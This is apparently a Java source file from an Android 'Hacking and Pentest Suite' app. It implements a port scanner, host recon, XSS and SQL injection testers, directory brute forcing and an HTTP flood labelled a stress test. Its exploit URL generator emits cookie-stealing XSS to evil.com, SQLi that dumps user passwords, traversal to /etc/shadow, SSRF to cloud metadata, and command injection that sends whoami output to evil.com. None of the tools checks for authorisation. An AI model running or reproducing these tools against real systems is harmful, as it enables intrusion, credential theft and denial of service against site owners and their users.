package com.vpr.server;

import android.os.Handler;
import java.io.*;
import java.net.*;
import java.util.*;
import java.util.concurrent.*;

public class SecurityTools {

    public static final String KALI =
        "\n" +
        "          000011111111111111111110                                                  \n" +
        "                                 011111111111                                       \n" +
        "                                            1111111                                 \n" +
        "                                                   111                              \n" +
        "                       011111111111111111111111111101                               \n" +
        "          011111100                                000                              \n" +
        "                                       0111111111111 1                              \n" +
        "                                 111110               11                            \n" +
        "                           01110                       1111111110                   \n" +
        "                       111                            111111111111111100            \n" +
        "                   11                               1111             1111110        \n" +
        "               11                                 1111                    11111     \n" +
        "            1                                    111                          11111 \n" +
        "                                                 110                           11111\n" +
        "                                                011                               111\n" +
        "                                                111                                  110\n" +
        "                                                 111                                   \n" +
        "                                                 1111                                  \n" +
        "                                                  1111                                 \n" +
        "                                                    11111                              \n" +
        "                                                      1111111111111111111              \n" +
        "                                                                    0111111111111      \n" +
        "                                                                           0111  11110 \n" +
        "                                                                               11     110\n" +
        "                                                                                 11      11\n" +
        "                                                                                   11      10\n" +
        "                                                                                     10     11\n" +
        "                                                                                      11      1\n" +
        "                                                                                       11      0\n" +
        "                                                                                        11      \n" +
        "                                                                                         1      \n" +
        "                                                                                          1     \n" +
        "                                                                                          10    \n" +
        "                                                                                           0    \n" +
        "\n" +
        "  VPR  --  Hacking and Pentest Suite\n" +
        "  The quieter you become,\n" +
        "  the more you are able to hear\n\n";

    private static final String[] UA_LIST = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
        "curl/7.88.1",
        "python-requests/2.31.0"
    };

    private static String randomUA() {
        return UA_LIST[new Random().nextInt(UA_LIST.length)];
    }

    private static HttpURLConnection openConn(String url, int timeout) throws Exception {
        URL u = new URL(url.startsWith("http") ? url : "http://" + url);
        HttpURLConnection c = (HttpURLConnection) u.openConnection();
        c.setConnectTimeout(timeout);
        c.setReadTimeout(timeout);
        c.setRequestProperty("User-Agent", randomUA());
        c.setRequestProperty("Accept", "*/*");
        c.setInstanceFollowRedirects(true);
        return c;
    }

    private static String readBody(HttpURLConnection c) {
        try {
            int code = c.getResponseCode();
            InputStream is = code >= 400 ? c.getErrorStream() : c.getInputStream();
            if (is == null) return "";
            BufferedReader br = new BufferedReader(new InputStreamReader(is));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) sb.append(line).append("\n");
            br.close();
            return sb.toString();
        } catch (Exception e) { return ""; }
    }

    public static String portScan(String host, int start, int end) {
        StringBuilder r = new StringBuilder(KALI);
        r.append("[ PORT SCANNER ]\n");
        r.append("  Target : ").append(host).append("\n");
        r.append("  Range  : ").append(start).append(" - ").append(end).append("\n");
        r.append("  ---\n");
        List<Integer> open = Collections.synchronizedList(new ArrayList<>());
        ExecutorService pool = Executors.newFixedThreadPool(300);
        List<Future<?>> futures = new ArrayList<>();
        for (int port = start; port <= end; port++) {
            final int p = port;
            futures.add(pool.submit(() -> {
                try (Socket s = new Socket()) {
                    s.connect(new InetSocketAddress(host, p), 250);
                    open.add(p);
                } catch (Exception ignored) {}
            }));
        }
        for (Future<?> f : futures) {
            try { f.get(5, TimeUnit.SECONDS); } catch (Exception ignored) {}
        }
        pool.shutdownNow();
        Collections.sort(open);
        if (open.isEmpty()) r.append("  No open ports.\n");
        else for (int p : open)
            r.append("  [OPEN] ").append(p).append("/tcp  ").append(svc(p)).append("\n");
        r.append("  ---\n");
        r.append("  Open: ").append(open.size()).append("\n");
        return r.toString();
    }

    public static String hostRecon(String host) {
        StringBuilder r = new StringBuilder(KALI);
        r.append("[ HOST RECON ]\n");
        r.append("  Target : ").append(host).append("\n");
        r.append("  ---\n");
        try {
            InetAddress addr = InetAddress.getByName(host);
            r.append("  IP       : ").append(addr.getHostAddress()).append("\n");
            r.append("  Hostname : ").append(addr.getCanonicalHostName()).append("\n");
            r.append("  Reach    : ").append(addr.isReachable(3000)).append("\n");
            r.append("  Type     : ").append(addr instanceof Inet4Address ? "IPv4" : "IPv6").append("\n");
            InetAddress[] all = InetAddress.getAllByName(host);
            r.append("  All IPs  :\n");
            for (InetAddress a : all)
                r.append("    - ").append(a.getHostAddress()).append("\n");
            r.append("\n  [ Geo ]\n");
            try {
                HttpURLConnection c = openConn(
                    "http://ip-api.com/json/" + addr.getHostAddress() +
                    "?fields=country,regionName,city,isp,org,as", 5000);
                c.connect();
                if (c.getResponseCode() == 200) {
                    String body = readBody(c)
                        .replace("{","").replace("}","")
                        .replace("\"","").replace(",","\n  ");
                    r.append("  ").append(body).append("\n");
                }
                c.disconnect();
            } catch (Exception e) {
                r.append("  Geo: ").append(e.getMessage()).append("\n");
            }
        } catch (Exception e) {
            r.append("  Error: ").append(e.getMessage()).append("\n");
        }
        r.append("  ---\n");
        return r.toString();
    }

    public static String headerGrab(String url) {
        StringBuilder r = new StringBuilder(KALI);
        r.append("[ HTTP HEADER GRAB ]\n");
        r.append("  Target : ").append(url).append("\n");
        r.append("  ---\n");
        try {
            HttpURLConnection c = openConn(url, 6000);
            c.connect();
            r.append("  Status : ").append(c.getResponseCode())
             .append(" ").append(c.getResponseMessage()).append("\n\n");
            for (Map.Entry<String, List<String>> h : c.getHeaderFields().entrySet()) {
                if (h.getKey() != null)
                    r.append("  ").append(h.getKey()).append(": ")
                     .append(String.join(", ", h.getValue())).append("\n");
            }
            c.disconnect();
        } catch (Exception e) {
            r.append("  Error: ").append(e.getMessage()).append("\n");
        }
        r.append("  ---\n");
        return r.toString();
    }

    public static String cveCheck(String url) {
        StringBuilder r = new StringBuilder(KALI);
        r.append("[ CVE / VULNERABILITY SCANNER ]\n");
        r.append("  Target : ").append(url).append("\n");
        r.append("  ---\n");
        try {
            HttpURLConnection c = openConn(url, 6000);
            c.connect();
            Map<String, List<String>> headers = c.getHeaderFields();
            int score = 90;
            String[][] checks = {
                {"X-Frame-Options","Clickjacking"},
                {"X-XSS-Protection","XSS filter"},
                {"Content-Security-Policy","CSP"},
                {"Strict-Transport-Security","HSTS"},
                {"X-Content-Type-Options","MIME sniff"},
                {"Referrer-Policy","Referrer leak"},
                {"Permissions-Policy","Feature policy"},
                {"Cross-Origin-Opener-Policy","COOP"},
                {"Cross-Origin-Resource-Policy","CORP"}
            };
            r.append("  [ Security Headers ]\n");
            for (String[] ch : checks) {
                boolean found = false;
                for (String k : headers.keySet())
                    if (k != null && k.equalsIgnoreCase(ch[0])) { found = true; break; }
                r.append(found ? "  [OK] " : "  [!!] ").append(ch[0])
                 .append(found ? "\n" : " MISSING - " + ch[1] + "\n");
                if (!found) score -= 10;
            }
            r.append("\n  [ Server Fingerprint ]\n");
            for (String k : new String[]{"Server","X-Powered-By","X-AspNet-Version","X-Generator"}) {
                for (Map.Entry<String, List<String>> e : headers.entrySet()) {
                    if (e.getKey() != null && e.getKey().equalsIgnoreCase(k)) {
                        r.append("  !! ").append(k).append(": ").append(e.getValue()).append("\n");
                        score -= 5;
                    }
                }
            }
            r.append("\n  Score  : ").append(Math.max(0, score)).append(" / 90\n");
            r.append("  Rating : ").append(score >= 70 ? "GOOD" : score >= 40 ? "MEDIUM" : "VULNERABLE").append("\n");
            c.disconnect();
        } catch (Exception e) {
            r.append("  Error: ").append(e.getMessage()).append("\n");
        }
        r.append("  ---\n");
        return r.toString();
    }

    public static String xssTest(String url) {
        StringBuilder r = new StringBuilder(KALI);
        r.append("[ XSS PAYLOAD TESTER ]\n");
        r.append("  Target : ").append(url).append("\n");
        r.append("  ---\n");
        String[][] payloads = {
            {"<script>alert(1)</script>","Basic Script"},
            {"\"><img src=x onerror=alert(1)>","IMG onerror"},
            {"<svg onload=alert(1)>","SVG onload"},
            {"<body onload=alert(1)>","Body onload"},
            {"<iframe src=javascript:alert(1)>","Iframe JS"},
            {"<details open ontoggle=alert(1)>","Details toggle"},
            {"<input onfocus=alert(1) autofocus>","Input focus"},
            {"<script>fetch(\"http://evil.com?c=\"+document.cookie)</script>","Cookie steal"},
            {"<img src=1 onerror=eval(atob(\"YWxlcnQoMSk=\"))>","Base64 eval"},
            {"<script>new Image().src=\"http://evil.com/?c=\"+document.cookie</script>","Image Beacon"}
        };
        int reflected = 0;
        for (String[] pl : payloads) {
            try {
                String encoded = URLEncoder.encode(pl[0], "UTF-8");
                String base = url.startsWith("http") ? url : "http://" + url;
                HttpURLConnection c = openConn(
                    base + (base.contains("?") ? "&" : "?") + "q=" + encoded, 4000);
                c.connect();
                int code = c.getResponseCode();
                String body = readBody(c).toLowerCase();
                c.disconnect();
                boolean isRef = body.length() > 0 &&
                    (body.contains(pl[0].substring(0, Math.min(6, pl[0].length())).toLowerCase()));
                r.append("  [").append(code).append("] ")
                 .append(isRef ? "REFLECTED " : "safe      ")
                 .append(pl[1]).append("\n");
                if (isRef) reflected++;
            } catch (Exception e) {
                r.append("  [ERR] ").append(pl[1]).append("\n");
            }
        }
        r.append("  ---\n");
        r.append("  Reflected: ").append(reflected).append(" / ").append(payloads.length).append("\n");
        return r.toString();
    }

    public static String sqlTest(String url) {
        StringBuilder r = new StringBuilder(KALI);
        r.append("[ SQL INJECTION TESTER ]\n");
        r.append("  Target : ").append(url).append("\n");
        r.append("  ---\n");
        String[] payloads = {
            "'","''","`","--",
            "1' OR '1'='1","1' OR '1'='1'--",
            "' OR 1=1--","admin'--",
            "1; DROP TABLE users--",
            "' UNION SELECT null--",
            "' UNION SELECT null,null--",
            "' UNION SELECT null,null,null--",
            "1' AND 1=2 UNION SELECT 1,2,3--",
            "1' AND sleep(3)--",
            "1' ORDER BY 1--",
            "1' ORDER BY 10--"
        };
        String[] errorSigns = {
            "sql","mysql","syntax","error","warning","exception",
            "ORA-","pg_","sqlite","JDBC","unclosed","unterminated",
            "you have an error","microsoft","oledb","odbc","database error"
        };
        int vuln = 0;
        for (String pl : payloads) {
            try {
                String encoded = URLEncoder.encode(pl, "UTF-8");
                String base = url.startsWith("http") ? url : "http://" + url;
                HttpURLConnection c = openConn(
                    base + (base.contains("?") ? "&" : "?") + "id=" + encoded, 5000);
                int code = c.getResponseCode();
                String body = readBody(c).toLowerCase();
                c.disconnect();
                boolean isVuln = false;
                String trigger = "";
                for (String sign : errorSigns) {
                    if (body.contains(sign.toLowerCase())) { isVuln = true; trigger = sign; break; }
                }
                r.append("  [").append(code).append("] ")
                 .append(isVuln ? "VULN [" + trigger + "] " : "safe           ")
                 .append(pl.length() > 22 ? pl.substring(0, 22) + "..." : pl).append("\n");
                if (isVuln) vuln++;
            } catch (Exception e) {
                r.append("  [ERR] ").append(pl.length() > 20 ? pl.substring(0, 20) : pl).append("\n");
            }
        }
        r.append("  ---\n");
        r.append("  Vulnerable: ").append(vuln).append(" / ").append(payloads.length).append("\n");
        return r.toString();
    }

    public static void dirBrute(String url, SessionView sv, Handler h) {
        h.post(() -> {
            sv.print(KALI);
            sv.print("[ DIRECTORY BRUTE FORCE ]\n");
            sv.print("  Target : " + url + "\n");
            sv.print("  ---\n");
        });
        String[] paths = {
            "admin","login","dashboard","wp-admin","phpmyadmin","cpanel",
            "administrator","api","api/v1","api/v2","backup","config",
            "db","database","uploads","files","images","static","assets",
            ".env",".git","robots.txt","sitemap.xml","readme.txt",
            "config.php","wp-config.php","index.php","phpinfo.php",
            "test","dev","staging","old","temp","tmp","user","users",
            "account","register","panel","manage","control","secure",
            "server-status",".htaccess",".htpasswd","web.config",
            "install","setup","cgi-bin","private","internal","secret",
            "archive","dump","logs","log","debug","backup.zip","backup.sql",
            "data.sql","dump.sql","credentials","passwords"
        };
        String base = (url.startsWith("http") ? url : "http://" + url).replaceAll("/$", "");
        final int[] found = {0};
        ExecutorService pool = Executors.newFixedThreadPool(20);
        List<Future<?>> futures = new ArrayList<>();
        for (String path : paths) {
            final String p = path;
            futures.add(pool.submit(() -> {
                try {
                    HttpURLConnection c = openConn(base + "/" + p, 3000);
                    c.setInstanceFollowRedirects(false);
                    c.connect();
                    int code = c.getResponseCode();
                    c.disconnect();
                    if (code != 404 && code != 400) {
                        found[0]++;
                        String status = code == 200 ? "FOUND   " :
                                        code == 403 ? "FORBID  " :
                                        (code == 301 || code == 302) ? "REDIRECT" :
                                        "? " + code;
                        h.post(() -> sv.print("  [" + code + "] " + status + " /" + p + "\n"));
                    }
                } catch (Exception ignored) {}
            }));
        }
        for (Future<?> f : futures) {
            try { f.get(6, TimeUnit.SECONDS); } catch (Exception ignored) {}
        }
        pool.shutdownNow();
        h.post(() -> {
            sv.print("  ---\n");
            sv.print("  Found: " + found[0] + " paths\n");
        });
    }

    public static void stressTest(String url, int threads, int requests,
                                   SessionView sv, Handler h) {
        h.post(() -> {
            sv.print(KALI);
            sv.print("[ STRESS TEST ]\n");
            sv.print("  Target   : " + url + "\n");
            sv.print("  Threads  : " + threads + "\n");
            sv.print("  Requests : " + requests + "\n");
            sv.print("  ---\n");
        });
        final int[] success = {0}, failed = {0};
        long start = System.currentTimeMillis();
        ExecutorService pool = Executors.newFixedThreadPool(Math.min(threads, 500));
        List<Future<?>> futures = new ArrayList<>();
        for (int i = 0; i < requests; i++) {
            futures.add(pool.submit(() -> {
                try {
                    HttpURLConnection c = openConn(url, 3000);
                    c.connect();
                    c.getResponseCode();
                    c.disconnect();
                    synchronized (success) { success[0]++; }
                } catch (Exception e) {
                    synchronized (failed) { failed[0]++; }
                }
            }));
        }
        for (Future<?> f : futures) {
            try { f.get(30, TimeUnit.SECONDS); } catch (Exception ignored) {}
        }
        pool.shutdownNow();
        long elapsed = System.currentTimeMillis() - start;
        long rps = requests * 1000L / Math.max(elapsed, 1);
        h.post(() -> {
            sv.print("  Success  : " + success[0] + "\n");
            sv.print("  Failed   : " + failed[0] + "\n");
            sv.print("  Duration : " + elapsed + "ms\n");
            sv.print("  RPS      : " + rps + " req/s\n");
            sv.print("  ---\n");
        });
    }

    public static String dnsLookup(String host) {
        StringBuilder r = new StringBuilder(KALI);
        r.append("[ DNS LOOKUP ]\n");
        r.append("  Host : ").append(host).append("\n");
        r.append("  ---\n");
        try {
            InetAddress[] all = InetAddress.getAllByName(host);
            for (InetAddress a : all)
                r.append("  ").append(a instanceof Inet4Address ? "A    " : "AAAA ")
                 .append(a.getHostAddress()).append("\n");
        } catch (Exception e) {
            r.append("  Error: ").append(e.getMessage()).append("\n");
        }
        r.append("  ---\n");
        return r.toString();
    }

    public static String ping(String host) {
        StringBuilder r = new StringBuilder(KALI);
        r.append("[ PING ]\n");
        r.append("  Target : ").append(host).append("\n");
        r.append("  ---\n");
        int replied = 0;
        long total = 0;
        try {
            InetAddress addr = InetAddress.getByName(host);
            for (int i = 1; i <= 5; i++) {
                long t = System.currentTimeMillis();
                boolean reach = addr.isReachable(2000);
                long ms = System.currentTimeMillis() - t;
                if (reach) { replied++; total += ms; }
                r.append("  [").append(i).append("] ")
                 .append(reach ? "Reply " + addr.getHostAddress() + " time=" + ms + "ms"
                               : "Timeout").append("\n");
            }
        } catch (Exception e) {
            r.append("  Error: ").append(e.getMessage()).append("\n");
        }
        r.append("  ---\n");
        r.append("  Sent:5 Recv:").append(replied).append(" Lost:").append(5 - replied).append("\n");
        if (replied > 0) r.append("  Avg RTT: ").append(total / replied).append("ms\n");
        return r.toString();
    }

    public static String bannerGrab(String host, int port) {
        StringBuilder r = new StringBuilder(KALI);
        r.append("[ BANNER GRAB ]\n");
        r.append("  Target : ").append(host).append(":").append(port).append("\n");
        r.append("  ---\n");
        try {
            Socket s = new Socket();
            s.connect(new InetSocketAddress(host, port), 3000);
            s.setSoTimeout(3000);
            BufferedReader br = new BufferedReader(new InputStreamReader(s.getInputStream()));
            StringBuilder banner = new StringBuilder();
            String line;
            int lines = 0;
            while ((line = br.readLine()) != null && lines++ < 5)
                banner.append(line).append("\n");
            s.close();
            r.append("  Banner:\n  ").append(banner.toString().trim()).append("\n");
        } catch (Exception e) {
            r.append("  Error: ").append(e.getMessage()).append("\n");
        }
        r.append("  ---\n");
        return r.toString();
    }

    public static String generateExploitURLs(String baseUrl) {
        StringBuilder r = new StringBuilder(KALI);
        r.append("[ EXPLOIT URL GENERATOR ]\n");
        r.append("  Base : ").append(baseUrl).append("\n");
        r.append("  ---\n");
        String base = baseUrl.startsWith("http") ? baseUrl : "http://" + baseUrl;
        String sep = base.contains("?") ? "&" : "?";

        String[][] xss = {
            {"q","<script>alert(document.cookie)</script>","Cookie Steal"},
            {"search","<img src=x onerror=alert(document.domain)>","Domain Leak"},
            {"id","<svg onload=fetch(\"http://evil.com?c=\"+btoa(document.cookie))>","Base64 Exfil"},
            {"q","<script>new Image().src=\"http://evil.com/?c=\"+document.cookie</script>","Image Beacon"}
        };
        r.append("\n  [ XSS Exploit URLs ]\n");
        for (String[] pl : xss) {
            try {
                r.append("  [XSS] ").append(pl[2]).append("\n");
                r.append("  ").append(base).append(sep).append(pl[0]).append("=")
                 .append(URLEncoder.encode(pl[1], "UTF-8")).append("\n\n");
            } catch (Exception ignored) {}
        }

        String[][] sqli = {
            {"id","1' OR '1'='1","Auth Bypass"},
            {"id","1' UNION SELECT username,password,3 FROM users--","Dump Users"},
            {"id","1' UNION SELECT table_name,2,3 FROM information_schema.tables--","Table Enum"},
            {"id","1' AND 1=2 UNION SELECT 1,@@version,3--","DB Version"}
        };
        r.append("  [ SQLi Exploit URLs ]\n");
        for (String[] pl : sqli) {
            try {
                r.append("  [SQLi] ").append(pl[2]).append("\n");
                r.append("  ").append(base).append(sep).append(pl[0]).append("=")
                 .append(URLEncoder.encode(pl[1], "UTF-8")).append("\n\n");
            } catch (Exception ignored) {}
        }

        String[][] path = {
            {"file","../../../../etc/passwd","Linux Passwd"},
            {"file","../../../../etc/shadow","Linux Shadow"},
            {"path","../../../../windows/win.ini","Windows INI"},
            {"doc","..%2F..%2F..%2Fetc%2Fpasswd","URL Encoded"}
        };
        r.append("  [ Path Traversal URLs ]\n");
        for (String[] pl : path) {
            r.append("  [PATH] ").append(pl[2]).append("\n");
            r.append("  ").append(base).append(sep).append(pl[0]).append("=")
             .append(pl[1]).append("\n\n");
        }

        String[][] ssrf = {
            {"url","http://localhost/admin","Localhost Admin"},
            {"url","http://127.0.0.1:8080","Loopback Port"},
            {"fetch","http://169.254.169.254/latest/meta-data/","AWS Metadata"},
            {"src","file:///etc/passwd","File Read"}
        };
        r.append("  [ SSRF Exploit URLs ]\n");
        for (String[] pl : ssrf) {
            try {
                r.append("  [SSRF] ").append(pl[2]).append("\n");
                r.append("  ").append(base).append(sep).append(pl[0]).append("=")
                 .append(URLEncoder.encode(pl[1], "UTF-8")).append("\n\n");
            } catch (Exception ignored) {}
        }

        String[][] cmd = {
            {"cmd","; ls -la","List Dir"},
            {"exec","| cat /etc/passwd","Read Passwd"},
            {"run","& whoami","Who Am I"},
            {"val","; curl http://evil.com/$(whoami)","Exfil User"}
        };
        r.append("  [ Command Injection URLs ]\n");
        for (String[] pl : cmd) {
            try {
                r.append("  [CMD] ").append(pl[2]).append("\n");
                r.append("  ").append(base).append(sep).append(pl[0]).append("=")
                 .append(URLEncoder.encode(pl[1], "UTF-8")).append("\n\n");
            } catch (Exception ignored) {}
        }

        r.append("  ---\n");
        r.append("  Exploit URLs generated.\n");
        return r.toString();
    }

    public static void fullExploit(String url, SessionView sv, Handler h) {
        h.post(() -> {
            sv.print(KALI);
            sv.print("[ FULL EXPLOIT SCAN ]\n");
            sv.print("  Target : " + url + "\n");
            sv.print("  ---\n");
            sv.print("  [1/4] Headers...\n");
        });
        String headers = headerGrab(url);
        h.post(() -> sv.print(headers));
        h.post(() -> sv.print("  [2/4] CVE scan...\n"));
        String cve = cveCheck(url);
        h.post(() -> sv.print(cve));
        h.post(() -> sv.print("  [3/4] XSS test...\n"));
        String xss = xssTest(url);
        h.post(() -> sv.print(xss));
        h.post(() -> sv.print("  [4/4] Exploit URLs...\n"));
        String exploits = generateExploitURLs(url);
        h.post(() -> sv.print(exploits));
    }

    private static String svc(int port) {
        Map<Integer, String> m = new HashMap<>();
        m.put(21,"FTP"); m.put(22,"SSH"); m.put(23,"Telnet");
        m.put(25,"SMTP"); m.put(53,"DNS"); m.put(80,"HTTP");
        m.put(110,"POP3"); m.put(143,"IMAP"); m.put(443,"HTTPS");
        m.put(445,"SMB"); m.put(3306,"MySQL"); m.put(5432,"PostgreSQL");
        m.put(6379,"Redis"); m.put(8080,"HTTP-Alt"); m.put(8443,"HTTPS-Alt");
        m.put(27017,"MongoDB"); m.put(3389,"RDP"); m.put(5900,"VNC");
        m.put(1433,"MSSQL"); m.put(1521,"Oracle"); m.put(9200,"Elasticsearch");
        m.put(11211,"Memcached");
        return m.getOrDefault(port, "unknown");
    }
}
